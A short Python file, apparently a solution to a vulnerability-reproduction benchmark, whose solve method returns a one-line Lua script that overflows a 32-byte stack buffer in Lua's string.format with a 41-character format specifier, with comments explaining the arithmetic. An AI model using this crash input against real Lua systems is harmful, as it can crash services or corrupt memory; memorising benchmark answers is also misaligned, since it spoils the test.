import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The problem describes a stack buffer overflow in integer formatting where the format
        # specifier string is copied into a 32-byte buffer. The components (modifier, width,
        # precision, etc.) can sum up to 45 bytes, overflowing the buffer.
        # This matches a known vulnerability in Lua (CVE-2020-24370 / commit 9d86b7).
        # We generate a Lua script that invokes string.format with a specifier longer than 32 chars.
        # Format specifier breakdown:
        # % (1) + 19 digits (width) + . (1) + 19 digits (precision) + d (1) = 41 chars.
        # This exceeds the 32-byte buffer, triggering the crash.
        return b'("%1111111111111111111.1111111111111111111d"):format(0)'
